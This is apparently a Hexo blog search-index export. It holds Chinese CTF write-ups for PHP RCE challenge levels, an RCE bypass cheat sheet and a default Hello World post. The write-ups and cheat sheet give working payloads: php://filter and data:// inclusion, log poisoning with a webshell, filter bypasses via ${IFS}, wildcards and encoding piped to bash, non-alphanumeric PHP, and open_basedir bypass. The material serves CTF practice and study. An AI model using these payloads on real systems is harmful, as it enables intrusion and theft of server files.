$c))&#123;</span><br></pre></td></tr></table></figure><p>这个不知道为什么不可以用passthru做，不过没关系，可以使用伪协议做，但是首先要先传参：</p><p>palyoad:</p><p>?c&#x3D;include%0a$_GET[1]?&gt;&amp;1&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</p><p>?c&#x3D;include$_GET[1]?&gt;&amp;1&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,<?php system("tac flag.php")?></p><p>上面的可以使用到36，不过要注意一些过滤，比如空格什么的</p><p>37：</p><p>if(isset($_GET[‘c’])){   $c &#x3D; $_GET[‘c’];   if(!preg_match(“&#x2F;flag&#x2F;i”, $c)){     include($c);     echo $flag;     } </p><p>使用选择使用data:[?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgCnN5c3RlbSgidGFjIGZsYWcucGhwIikKPz4&#x3D;</p><p>或者传小🐎：</p><p>?c&#x3D;include$_GET[a]?%3E&amp;a&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log<br> &#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log是nginx默认的access日志路径，访问该路径时，在User-Agent中写入一句话木马，然后用中国蚁剑连接即可</p><p>然后一直到39关了上面的都大差不差</p><p>40：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(!preg_match(&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;, $c)</span><br></pre></td></tr></table></figure><p>这个一下子给我弄不会了，</p><p>只能看wp做了：</p><p>法一</p><p>c&#x3D;eval(array_pop(next(get_defined_vars())));&#x2F;&#x2F;需要POST传入参数为1&#x3D;system(‘tac fl*’);</p><p>get_defined_vars() 返回一个包含所有已定义变量的多维数组。这些变量包括环境变量、服务器变量和用户定义的变量，例如GET、POST、FILE等等。</p><p>next()将内部指针指向数组中的下一个元素，并输出。</p><p>array_pop() 函数删除数组中的最后一个元素并返回其值。</p><p>法二</p><p>c&#x3D;show_source(next(array_reverse(scandir(pos(localeconv()))))); 或者 c&#x3D;show_source(next(array_reverse(scandir(getcwd()))));</p><p>getcwd() 函数返回当前工作目录。它可以代替pos(localeconv())</p><p>localeconv()：返回包含本地化数字和货币格式信息的关联数组。这里主要是返回值为数组且第一项为”.”</p><p>pos():输出数组第一个元素，不改变指针；</p><p>current() 函数返回数组中的当前元素（单元）,默认取第一个值，和pos()一样</p><p>scandir() 函数返回指定目录中的文件和目录的数组。这里因为参数为”.”所以遍历当前目录</p><p>array_reverse():数组逆置</p><p>next():将数组指针指向下一个，这里其实可以省略倒置和改变数组指针，直接利用[2]取出数组也可以</p><p>show_source():查看源码</p><p>pos() 函数返回数组中的当前元素的值。该函数是current()函数的别名。</p><p>每个数组中都有一个内部的指针指向它的”当前”元素，初始指向插入到数组中的第一个元素。</p><p>提示：该函数不会移动数组内部指针。</p><p>相关的方法：</p><p>current()返回数组中的当前元素的值。</p><p>end()将内部指针指向数组中的最后一个元素，并输出。</p><p>next()将内部指针指向数组中的下一个元素，并输出。</p><p>prev()将内部指针指向数组中的上一个元素，并输出。</p><p>reset()将内部指针指向数组中的第一个元素，并输出。</p><p>each()返回当前元素的键名和键值，并将内部指针向前移动。</p><p>然后41跑yu师傅脚本就ok了</p><p>42：</p><p>终于简单了；</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;   $c=$_GET[&#x27;c&#x27;];   system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;); &#125;else&#123;   highlight_file(__FILE__); &#125;</span><br></pre></td></tr></table></figure><p>这行代码执行一个系统命令，该命令由变量 $c 的值指定。&gt;&#x2F;dev&#x2F;null 2&gt;&amp;1 是一个 shell  重定向操作，意味着命令的标准输出（stdout）和标准错误（stderr）都被重定向到  &#x2F;dev&#x2F;null，即被丢弃，（个人理解是内容注释注释）用户不会看到任何输出结果 所以直接&#x2F;c&#x3D;cat flag.php||%0a使用管道符进行绕过让他执行前面的</p><p>43：</p><p>比前面多过滤了cat、；，那就利用tac，uniq,less,more,strings,nl命令来打印，“||”分割</p><p>或者使用重定向：nl%20flag.php| tee 1.txt然后访问1.txt</p><p>44呢和43差不多,就多了一个flag,可以?l*.php</p><p>45(多了cat):</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(!preg_match(&quot;/\;|cat|flag| /i&quot;, $c))&#123;     system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;); </span><br></pre></td></tr></table></figure><p>palyad:c&#x3D;uniq${IFS}?l*.php||</p><p>46-53:</p><p>都差不多，可以多记点替代cat的和system以及空格的</p><p>54：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(!preg_match(&quot;/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;, $c))</span><br></pre></td></tr></table></figure><p>过滤 了很多命令。 中间这些个很多的星号的内容，其实 是说，含有 cat,more这样的会被匹配，如cat 那么ca323390ft或c232fa3kdfst, 凡是按序出现了cat 都被匹配。 这时，我们不能直接写ca?因为这样是匹配不到命令的。 只能把全路径写出来，如&#x2F;bin&#x2F;ca?,与&#x2F;bin&#x2F;ca?匹配的，只有&#x2F;bin&#x2F;cat命令，这样就用到了cat 命令了。</p><p>于是，有了payload</p><p>?c&#x3D;&#x2F;bin&#x2F;ca?${IFS}????.???   然后   查看源码</p><p>55:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(!preg_match(&quot;/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;, $c))</span><br></pre></td></tr></table></figure><p>由于过滤了字母，但没有过滤数字可以考虑数字编码：$’\164\141\143’ $’\146\154\141\147\56\160\150\160’</p><p>也可以使用通配符?来进行代替</p><p>?c&#x3D;&#x2F;bin&#x2F;base64 flag.php</p><p>替换后变成</p><p>?c&#x3D;&#x2F;???&#x2F;????64 ????.???</p><p>56+57：这个的话没看明白</p><p>58-65：</p><p>进行post传c,并且eval($c)</p><p>这里嘛，要引入新的函数：show_source,highlight_file;这两个都是对文件进行语法高亮显示</p><p>那么palyad就出来了：c&#x3D;show_source(‘flag.php’);&#x2F;highlight_file(‘flag.php’);</p><p>或者可以利用文件包含写：c&#x3D;include($_POST[‘w’]);&amp;w&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</p><p>66-67:</p><p>这个呢引入一个新的东西：print_r(scandir(“&#x2F;“));(print_r或者也可以换成var_dump&#x2F;var_export)和前面的一样不过在本目录下面没有flag.php&#x2F;txt,那个新的东西是查看指定的目录，先返回根目录，然后就发现根目录下面存在着flag.txt，那个就可以show_source(“&#x2F;flag.txt”);或者另一个；</p><p>68-70:</p><p>这一关禁用了highlight_file。依然可以使用上一关的var_dump结合scandir来显示根目录的文件列表。<br> c&#x3D;var_dump(scandir(‘&#x2F;‘));之后show_source和highlight_file都用不了,试试include和require即可。</p><p>71：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: Lazzaro</span><br><span class="line"># @Date:   2020-09-05 20:49:30</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-07 22:02:47</span><br><span class="line"># @email: h1xa@ctfer.com</span><br><span class="line"># @link: https://ctfer.com</span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">ini_set(&#x27;display_errors&#x27;, 0);</span><br><span class="line">// 你们在炫技吗？</span><br><span class="line">if(isset($_POST[&#x27;c&#x27;]))&#123;</span><br><span class="line">        $c= $_POST[&#x27;c&#x27;];</span><br><span class="line">        eval($c);</span><br><span class="line">        $s = ob_get_contents();</span><br><span class="line">        ob_end_clean();</span><br><span class="line">        echo preg_replace(&quot;/[0-9]|[a-z]/i&quot;,&quot;?&quot;,$s);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">你要上天吗？</span><br></pre></td></tr></table></figure><p>这个的话，查看源代码，可以看到他将数字和字母换成？了，那个可以利用缓冲区用exit();结束</p><p>提前终止程序，即执行完代码直接退出，可以调用的函数有：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">exit</span>();</span><br><span class="line"><span class="keyword">die</span>();</span><br></pre></td></tr></table></figure><p>然后的话就是使用c&#x3D;var_export进行扫描文件根目录：c&#x3D;var_export(scandir(“&#x2F;“));exit;再c&#x3D;include(“&#x2F;flag.txt”);exit();</p><p>剩下的以后再说，有点不会了。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>RCE</title>
      <link href="/2025/03/02/RCE/"/>
      <url>/2025/03/02/RCE/</url>
      
        <content type="html"><![CDATA[<h4 id="1-简述："><a href="#1-简述：" class="headerlink" title="1.简述："></a>1.简述：</h4><p>在很多Web应用中，开发人员会使用一些特殊函数，这些函数以一些字符串作为输入，功能是将输入的字符串当作代码或者命令来进行执行。当用户可以控制这些函数的输入时，就产生了RCE漏洞。</p><p>危害：可以让用户（通常是系统管理员或普通用户）执行任意系统命令的漏洞。这种漏洞通常存在于某些程序或脚本中，允许输入参数被编码并传递给可执行文件。</p><p> 比如：如果应用系统从设计上需要给用户提供指定的远程命令操作的接口，比如常见的路由器、防火墙、入侵检测等设备的web管理界面上，一般会给用户提供一个ping操作的web界面，用户从web界面输入目标IP，提交后，后台会对该IP地址进行一次ping测试，并返回测试结果。而如果设计者在完成该功能时，没有做严格的安全控制，则可能会导致攻击者通过该接口提交“意想不到”的命令，从而让后台进行执行，从而控制整个后台服务器。</p><h4 id="2-分类：命令执行和代码执行"><a href="#2-分类：命令执行和代码执行" class="headerlink" title="2.分类：命令执行和代码执行"></a>2.分类：命令执行和代码执行</h4><h4 id="3-常见函数："><a href="#3-常见函数：" class="headerlink" title="3.常见函数："></a>3.常见函数：</h4><h5 id="1-命令执行函数："><a href="#1-命令执行函数：" class="headerlink" title="(1)命令执行函数："></a>(1)命令执行函数：</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">system()：能将字符串作为OS命令执行，且返回命令执行结果；</span><br><span class="line"></span><br><span class="line">exec()：能将字符串作为OS命令执行，但是只返回执行结果的最后一行(约等于无回显)；</span><br><span class="line"></span><br><span class="line">shell_exec()：能将字符串作为OS命令执行</span><br><span class="line"></span><br><span class="line">passthru()：能将字符串作为OS命令执行，只调用命令不返回任何结果，但把命令的运行结果原样输出到标准输出设备上；</span><br><span class="line"></span><br><span class="line">popen()：打开进程文件指针</span><br><span class="line"></span><br><span class="line">proc_open()：与popen()类似</span><br><span class="line"></span><br><span class="line">pcntl_exec()：在当前进程空间执行指定程序；</span><br><span class="line"></span><br><span class="line">反引号``：反引号``内的字符串会被解析为OS命令；</span><br><span class="line"></span><br><span class="line">补充：OS命令执行是指将用户的文本命令通过操作系统转化为二进制指令并执行的过程</span><br></pre></td></tr></table></figure><h5 id="2-代码执行函数："><a href="#2-代码执行函数：" class="headerlink" title="(2)代码执行函数："></a>(2)代码执行函数：</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eval()：将字符串作为php代码执行；</span><br><span class="line"></span><br><span class="line">assert()：将字符串作为php代码执行；</span><br><span class="line"></span><br><span class="line">preg_replace()：正则匹配替换字符串；</span><br><span class="line"></span><br><span class="line">create_function()：主要创建匿名函数；</span><br><span class="line"></span><br><span class="line">call_user_func()：回调函数，第一个参数为函数名，第二个参数为函数的参数；</span><br><span class="line"></span><br><span class="line">call_user_func_array()：回调函数，第一个参数为函数名，第二个参数为函数参数的数组；</span><br><span class="line"></span><br><span class="line">可变函数：若变量后有括号，该变量会被当做函数名为变量值(前提是该变量值是存在的函数名)的函数执行；</span><br></pre></td></tr></table></figure><h4 id="4-常见绕过："><a href="#4-常见绕过：" class="headerlink" title="4.常见绕过："></a>4.常见绕过：</h4><h5 id="1-管道符绕过："><a href="#1-管道符绕过：" class="headerlink" title="(1)管道符绕过："></a>(1)管道符绕过：</h5><p>；：即；前后都执行</p><p>&amp;：即&amp;前后都执行</p><p>&amp;&amp;：即如果&amp;&amp;前为真才执行&amp;&amp;后面的，不然只执行&amp;&amp;前面的</p><p>| ：即显示|后面的执行结果</p><p>||：||前面为假时才执行||后面的，否则只执行||前面的</p><h5 id="2-空格过滤："><a href="#2-空格过滤：" class="headerlink" title="(2)空格过滤："></a>(2)空格过滤：</h5><p>空格可以替换成：</p><p>&lt;  &lt;&gt;  %20(即space) %09(即TAB)  $IFS$9  ${IFS}  $IFS  {}</p><h5 id="3-反斜杠："><a href="#3-反斜杠：" class="headerlink" title="(3)反斜杠："></a>(3)反斜杠：</h5><p>如cat、ls被过滤，使用\绕过：<br>c\at &#x2F;flag<br>l\s &#x2F;</p><h5 id="4-取反绕过："><a href="#4-取反绕过：" class="headerlink" title="(4)取反绕过："></a>(4)取反绕过：</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//取反传参</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$a = &quot;system&quot;;</span><br><span class="line">$b = &quot;cat /flag&quot;;</span><br><span class="line"></span><br><span class="line">$c = urlencode(~$a);</span><br><span class="line">$d = urlencode(~$b);</span><br><span class="line"></span><br><span class="line">//输出得到取反传参内容</span><br><span class="line">echo &quot;?cmd=(~&quot;.$c.&quot;)(~&quot;.$d.&quot;);&quot;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h5 id="5-异或绕过"><a href="#5-异或绕过" class="headerlink" title="(5)异或绕过:"></a>(5)异或绕过:</h5><p>这里推荐yu师傅的脚本</p><p><a href="https://blog.csdn.net/miuzzx/article/details/109143413">https://blog.csdn.net/miuzzx/article/details/109143413</a></p><p><a href="https://blog.csdn.net/miuzzx/article/details/108569080">https://blog.csdn.net/miuzzx/article/details/108569080</a></p><h5 id="6-黑名单绕过："><a href="#6-黑名单绕过：" class="headerlink" title="(6)黑名单绕过："></a>(6)黑名单绕过：</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//变量拼接，如flag被过滤</span><br><span class="line">将：</span><br><span class="line">cat /flag</span><br><span class="line">替换为：</span><br><span class="line">b=ag;cat /fl$b</span><br><span class="line"></span><br><span class="line">//读取根目录</span><br><span class="line">eval(var_dump(scandir(&#x27;/&#x27;));  /.是本级目录</span><br><span class="line">//读flag</span><br><span class="line">eval(var_dump(file_get_contents($_GET[&#x27;a&#x27;])););&amp;a=/flag</span><br><span class="line"></span><br><span class="line">//等效于打开ls目录下的文件</span><br><span class="line">cat `ls`</span><br><span class="line"></span><br><span class="line">//_被过滤，php8以下，变量名中的第一个非法字符[会被替换为下划线_</span><br><span class="line">N[S.S等效于N_S.S</span><br><span class="line">php需要接收e_v.a.l参数,给e[v.a.l传参即可</span><br><span class="line"></span><br><span class="line">//php标签绕过</span><br><span class="line">?&gt;&lt;?= phpinfo(); ?&gt;</span><br></pre></td></tr></table></figure><h5 id="7-base和hexo编码绕过："><a href="#7-base和hexo编码绕过：" class="headerlink" title="(7)base和hexo编码绕过："></a>(7)base和hexo编码绕过：</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//base64编码绕过,编码cat /flag，反引号、| bash、$()用于执行系统命令</span><br><span class="line">`echo Y2F0IC9mbGFn | base64 -d`</span><br><span class="line">echo Y2F0IC9mbGFn | base64 -d | bash</span><br><span class="line">$(echo Y2F0IC9mbGFn | base64 -d)</span><br><span class="line"></span><br><span class="line">//hex编码绕过，编码cat /flag,| bash用于执行系统命令</span><br><span class="line">echo &#x27;636174202f666c6167&#x27; | xxd -r -p | bash</span><br><span class="line"></span><br><span class="line">//shellcode编码</span><br><span class="line">//十六进制编码</span><br></pre></td></tr></table></figure><h5 id="8-正则匹配绕过："><a href="#8-正则匹配绕过：" class="headerlink" title="(8)正则匹配绕过："></a>(8)正则匹配绕过：</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//如flag被过滤</span><br><span class="line">cat /f???</span><br><span class="line">cat /fl*</span><br><span class="line">cat /f[a-z]&#123;3&#125;</span><br><span class="line"></span><br><span class="line">cat /?l*</span><br></pre></td></tr></table></figure><h5 id="9-引号绕过："><a href="#9-引号绕过：" class="headerlink" title="(9)引号绕过："></a>(9)引号绕过：</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//如cat、ls被过滤*</span><br><span class="line"></span><br><span class="line">ca&quot;&quot;t /flag</span><br><span class="line"></span><br><span class="line">l&#x27;s&#x27; /</span><br></pre></td></tr></table></figure><h5 id="10-cat替换命令："><a href="#10-cat替换命令：" class="headerlink" title="(10)cat替换命令："></a>(10)cat替换命令：</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tac与cat相反，按行反向输出</span><br><span class="line">more按页显示，用于文件内容较多且不能滚动屏幕时查看文件</span><br><span class="line">less与more类似</span><br><span class="line">tail查看文件末几行</span><br><span class="line">head查看文件首几行</span><br><span class="line">nl在cat查看文件的基础上显示行号</span><br><span class="line">od以二进制方式读文件，od -A d -c /flag转人可读字符</span><br><span class="line">xxd以二进制方式读文件，同时有可读字符显示</span><br><span class="line">sort排序文件</span><br><span class="line">uniq报告或删除文件的重复行</span><br><span class="line">file -f报错文件内容</span><br><span class="line">grep过滤查找字符串，grep flag /flag</span><br><span class="line"></span><br><span class="line">strings(也是)</span><br></pre></td></tr></table></figure><h5 id="11-无回显绕过："><a href="#11-无回显绕过：" class="headerlink" title="(11)无回显绕过："></a>(11)无回显绕过：</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//无回显RCE，如exce()函数，可将执行结果输出到文件再访问文件执行以下命令后访问1.txt即可</span><br><span class="line">ls / | tee 1.txt</span><br><span class="line">cat /flag | tee 2.txt</span><br><span class="line">//eval()无输出</span><br><span class="line">eval(print`c\at /flag`;)</span><br></pre></td></tr></table></figure><h5 id="12-无参数RCE"><a href="#12-无参数RCE" class="headerlink" title="(12)无参数RCE"></a>(12)无参数RCE</h5><p>​    利用getallheaders()、get_defined_vars()、session_id等；</p><p>例(get_defined_vars())：get_defined_vars()是获得四个全局变量<code>$_GET $_POST $_FILES $_COOKIE</code>，而它的返回值是一个二维数组，我们利用<code>GET</code>方式传入的参数在第一个数组中。这里我们就需要先将二维数组转换为一维数组，这里我们用到<code>current()</code>函数，这个函数的作用是返回数组中的当前单元，而它的默认是第一个单元，也就是我们GET方式传入的参数，我们可以看看实际效果：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=eval(end(current((get_defined_vars()));wllm=phpinfo();</span><br></pre></td></tr></table></figure><h5 id="13-无字母数字RCE"><a href="#13-无字母数字RCE" class="headerlink" title="(13)无字母数字RCE"></a>(13)无字母数字RCE</h5><p>​    异或、取反、自增、临时文件上传；</p><h5 id="14-取反绕过："><a href="#14-取反绕过：" class="headerlink" title="(14)取反绕过："></a>(14)取反绕过：</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//取反传参</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$a = &quot;system&quot;;</span><br><span class="line">$b = &quot;cat /flag&quot;;</span><br><span class="line"></span><br><span class="line">$c = urlencode(~$a);</span><br><span class="line">$d = urlencode(~$b);</span><br><span class="line"></span><br><span class="line">//输出得到取反传参内容</span><br><span class="line">echo &quot;?cmd=(~&quot;.$c.&quot;)(~&quot;.$d.&quot;);&quot;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h5 id="15-长度限制："><a href="#15-长度限制：" class="headerlink" title="(15)长度限制："></a>(15)长度限制：</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">touch &quot;ag&quot;</span><br><span class="line"></span><br><span class="line">touch &quot;fl\\&quot;</span><br><span class="line"></span><br><span class="line">touch &quot;t \\&quot;</span><br><span class="line"></span><br><span class="line">touch &quot;ca\\&quot;</span><br><span class="line"></span><br><span class="line">ls -t</span><br><span class="line"></span><br><span class="line">-&gt;ca\ ,  t \  ,  fl\  ,  ag  ,  shell ,  flag</span><br><span class="line"></span><br><span class="line">ls -t &gt; shell</span><br><span class="line"></span><br><span class="line">sh shell(读取flag)</span><br><span class="line"></span><br><span class="line">空格\ ： 这个其实是换行。</span><br><span class="line">ls -t ：按照时间将文本排序输出</span><br><span class="line">ls -t &gt; shell：将ls -t的输出储存到shell文件中</span><br><span class="line">我们首先是用touch命令创建了几个文件，但是他们的文件名是我们的主要。我们使用两个\\的原因在于，第一个\用于将后面的\变成字符串，第二个\是用来将后面的文本转换为字符串，以便用于后面的测试。</span><br></pre></td></tr></table></figure><h4 id="补充："><a href="#补充：" class="headerlink" title="补充："></a>补充：</h4><p>关于有一些全是报错的；就比如使用var_export(scandir(“&#x2F;“));扫描根目录文件结果发现全是？！什么的；就是全给你替换了，我们可以结合 exit() 函数执行php代码让后面的匹配缓冲区不执行直接退出</p><p>提前终止程序，即执行完代码直接退出，可以调用的函数有：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">exit</span>();</span><br><span class="line"><span class="keyword">die</span>();</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">使用 glob:// 伪协议绕过 open_basedir，读取根目录下的文件，payload：</span><br><span class="line"></span><br><span class="line">c=?&gt;&lt;?php $a=new DirectoryIterator(&quot;glob:///*&quot;);</span><br><span class="line">foreach($a as $f)</span><br><span class="line">&#123;</span><br><span class="line">   echo($f-&gt;__toString().&#x27; &#x27;);</span><br><span class="line">&#125;</span><br><span class="line">exit(0);</span><br><span class="line">?&gt;</span><br><span class="line">或者c=$a=new DirectoryIterator(&#x27;glob:///*&#x27;);foreach($a as $f)&#123;echo($f-&gt;__toString().&quot; &quot;);&#125;exit(0);</span><br><span class="line"></span><br><span class="line">c=$a=new DirectoryIterator(&#x27;glob:///*&#x27;);foreach($a as $f)&#123;echo($f-&gt;getFilename().&quot; &quot;);&#125; exit(0);</span><br></pre></td></tr></table></figure><h5 id="关于极限RCE"><a href="#关于极限RCE" class="headerlink" title="关于极限RCE:"></a>关于极限RCE:</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$_=[].&#x27;&#x27;;  //得到Array</span><br><span class="line">$_=$_[&#x27;/&#x27;==&#x27;+&#x27;];   //让[]里的值报错返回0,取Array[0]=A，此时$_=A</span><br><span class="line">$____=&#x27;_&#x27;;   //让$____=_，后面容易拼接</span><br><span class="line">$__=$_;   //将A赋给$__</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;  //A自增到G，此时$__=G</span><br><span class="line">$____.=$__; //将_和G拼接起来，此时$____=_G</span><br><span class="line">$__=$_;   //再将$__还原成A</span><br><span class="line">$__++;$__++;$__++;$__++;  //A自增到E,此时__=E</span><br><span class="line">$____.=$__;  //E和_G拼接，此时$____为_GE</span><br><span class="line">$__=$_;  //再将__换源成A</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;  //A自增成T此时__=T</span><br><span class="line">$____.=$__;  //再拼接成_GET，此时$____=_GET</span><br><span class="line">$_=$____;   //为了方便起见，我们把____换成_</span><br><span class="line">($$_[_])($$_[__]);  //拼成我们想要的($_GET[_])($_GET[__]),传入_和__命令执行即可 </span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2025/02/18/hello-world/"/>
      <url>/2025/02/18/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
